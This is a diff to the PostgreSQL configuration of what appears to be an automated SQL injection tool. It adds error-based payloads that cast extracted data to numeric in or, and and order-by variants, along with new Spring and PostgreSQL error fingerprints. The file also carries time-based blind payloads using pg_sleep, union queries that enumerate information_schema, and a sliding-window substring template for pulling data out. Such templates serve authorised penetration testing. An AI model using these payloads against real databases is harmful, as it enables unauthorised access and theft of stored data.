@@ -28,10 +28,10 @@ resource:
                    || q::text
                    || '${enclose_value_sql}'
                from (
-                   SELECT
+                   select
                        tables.table_schema r,
                        count(table_name) q
-                   FROM information_schema.tables
+                   from information_schema.tables
                    group by r
                    order by r
                    ${limit}
@@ -52,10 +52,10 @@ resource:
                    || q::text
                    || '${enclose_value_sql}'
                from (
-                   SELECT
+                   select
                        tables.table_name r,
                        '0' q
-                   FROM information_schema.tables
+                   from information_schema.tables
                    where tables.TABLE_SCHEMA = '${database}'
                    order by r
                    ${limit}
@@ -76,10 +76,10 @@ resource:
                    || q::text
                    || '${enclose_value_sql}'
                from (
-                   SELECT
+                   select
                        columns.column_name r,
                        '0' q
-                   FROM information_schema.columns
+                   from information_schema.columns
                    where columns.TABLE_SCHEMA = '${database}'
                    and columns.TABLE_name = '${table}'
                    order by r
@@ -102,10 +102,10 @@ resource:
                     || q::text
                     || '${enclose_value_sql}'
                 from (
-                    SELECT
+                    select
                         substr((${fields}), 1, 775) r,
                         count(*) q
-                    FROM ${database}.${table}
+                    from ${database}.${table}
                     group by r
                     ${limit}
                 )x
@@ -121,11 +121,9 @@ strategy:
  configuration:
   slidingWindow: |
    select
-       /**
-        * If reach end of string (${lead}i) then NULLIF nullifies the result
-        */
+       /* If reach end of string (${lead}i) then NULLIF nullifies the result */
        '${lead}'
-       || NULLIF(
+       || nullif(
            substr(
                (${injection}),
                ${window.char},
@@ -140,10 +138,18 @@ strategy:
   endingComment: --+-
   fingerprint:
    errorMessage:
+    # Spring
+    - Unterminated string literal started at position \\d+ in SQL .*. Expected .* char
+    - Unterminated identifier started at position \\d+ in SQL .*. Expected .* char
+    - 'ERROR: syntax error at or near ".*"[\\r\\n]+  Position: \\d+'
+    - 'ERROR: syntax error at end of input[\\r\\n]+  Position: \\d+'
+    
     - "ERROR: unterminated quoted identifier at or near"
     - "Query failed: ERROR:  unterminated quoted string at or near"
     - function\\.pg
     - PostgreSQL
+   orderByErrorMessage:
+    - ORDER BY position 1337 is not in select list
 
  normal:
   indices: union select ${indices}
@@ -190,20 +196,36 @@ strategy:
    ${boolean.mode} ''=''
    || (
        select
-           CASE WHEN ${test}
-           THEN ''
+           case when ${test}
+           then ''
            else pg_sleep(${sleep_time})
-       END
+       end
    )
 
  error:
   method:
-   - name: CAST::text_numeric
+  
+   - name: Cast:or
      query: |
-      /* Require FALSE statement, then OR */
-      and 1 = 0
-      or 1 = CAST(
-          (${window})::text
-          AS NUMERIC
+      /* ERROR: invalid input syntax for type numeric: "<sqli>" */
+      or 1 = cast((
+          ${window}
+          )::text as numeric
+      )
+     capacity: 255
+     
+   - name: Cast:and
+     query: |
+      and 1 = cast((
+          ${window}
+          )::text as numeric
+      )
+     capacity: 255
+     
+   - name: Cast:order by
+     query: |
+      1, cast((
+          ${window}
+          )::text as numeric
       )
      capacity: 255
